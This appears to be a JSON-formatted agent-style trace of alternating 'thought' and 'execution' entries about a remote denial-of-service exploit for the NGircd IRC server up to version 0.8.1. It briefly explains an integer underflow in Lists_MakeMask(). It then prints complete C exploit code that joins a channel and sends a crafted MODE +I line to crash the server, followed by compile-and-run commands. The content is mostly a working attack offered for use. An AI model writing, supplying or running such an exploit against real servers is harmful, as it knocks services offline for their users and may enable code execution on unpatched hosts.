[
    {
        "type": "thought",
        "content": "The Lists_MakeMask() function in lists.c suffers from an integer underflow issue. This vulnerability allows a remote attacker to cause a denial of service (DoS) by crashing the application or potentially execute arbitrary code through a specially crafted MODE line. The underlying issue is an incorrect length calculation leading to a buffer overflow.\nMain Function:\n\nThe program takes four command-line arguments: the target host, target port, nickname to use, and channel to join. If not provided, default values are used.\nIt establishes a TCP connection to the target IRC server."
    },
    {
        "type": "execution",
        "content": "int main(int argc, char *argv[]) {\n     struct sockaddr_in trg;\n     struct hostent *he;\n long addr;\n     int sockfd, buff,rc;\n char evilbuf[1024];\n char buffer[1024];\n char *nick=\"AntiServer\";\n char *channel=\"Die_NGircd\";\n char *request;\n if(argv[3] != NULL) nick=argv[3];\n if(argv[4] != NULL) channel=argv[4];\n if(argc < 3 ) {\n  help(argv[0]);\n  exit(0);\n }\n printf(\"\\n\\n-=[ NGircd <= 0.8.1 Remote DoS ::: Coded by Expanders ]=-\\n\");\n     he = gethostbyname(argv[1]);\n     sockfd = socket(AF_INET, SOCK_STREAM, 0);\n     request = (char *) malloc(12344);\n     trg.sin_family = AF_INET;\n     trg.sin_port = htons(atoi(argv[2]));\n     trg.sin_addr = *((struct in_addr *) he->h_addr);\n     memset(&(trg.sin_zero), '\\0', 8);\n printf(\"\\n\\nConnecting to target \\t...\");\n rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));\n if(rc==0)\n {\n  printf(\"[Done]\\nBuilding evil buffer\\t...\");\n  memset(evilbuf,65,300);\n  memset(evilbuf+300,64,1);\n  memset(evilbuf+301,65,128);\n  printf(\"[Done]\\nSending NICK           \\t...\");\n  sprintf(request,\"NICK %s\\n\",nick);\n  send(sockfd,request,strlen(request),0);\n  printf(\"[Done]\\nSending USER           \\t...\");\n  sprintf(request,\"USER %s x0n3-h4ck.org eth0.x0n3-h4ck.org:%s\\n\",nick,nick);\n  send(sockfd,request,strlen(request),0);\n  buff=recv(sockfd, buffer, 256, 0);\n  printf(\"[Done]\\nJoining Channel        \\t...\");\n  sprintf(request,\"JOIN #%s\\n\",channel);\n  send(sockfd,request,strlen(request),0);\n  printf(\"[Done]\\nSending evil request   \\t...\");\n  sprintf(request,\"MODE #%s +I %s\\n\",channel,evilbuf);\n  send(sockfd,request,strlen(request),0);\n  sprintf(request,\"QUIT www.x0n3-h4ck.org\\n\",evilbuf);\n  send(sockfd,request,strlen(request),0);\n  sleep(2);\n  printf(\"[Done]\\nTrying to reconnect\\t...\");\n  close(sockfd);\n  sockfd = socket(AF_INET, SOCK_STREAM, 0);\n  sleep(1);\n  rc=connect(sockfd, (struct sockaddr *)&trg, sizeof(struct sockaddr_in));\n  if(rc==0)\n   printf(\"[Fail] -> Damn! Attack Failed!\\n\\n\");\n  else\n   printf(\"[Done] -> Attack Success! Lets party!\\n\\n\");\n }\n else\n  printf(\"[Fail] -> Unable to connect\\n\\n\");\n close(sockfd);\n return 0;\n\n}"
    },
    {
        "type": "thought",
        "content": "Building and Sending Requests:\n\nIt constructs the payload by creating an \"evil\" buffer filled with specific characters designed to exploit the vulnerability.\nSends IRC commands (NICK, USER, JOIN) to connect to the server and join a specified channel.\nSends a specially crafted MODE command with the \"evil\" buffer to trigger the vulnerability.\nConnection Handling:\n\nAttempts to reconnect to the server to determine if the attack was successful."
    },
    {
        "type": "execution",
        "content": "Save it as a c file and compile it."
    },
    {
        "type": "thought",
        "content": "gcc -o exploit 25070.c && ./exploit 127.0.0.1 6667 b #TheName"
    }
]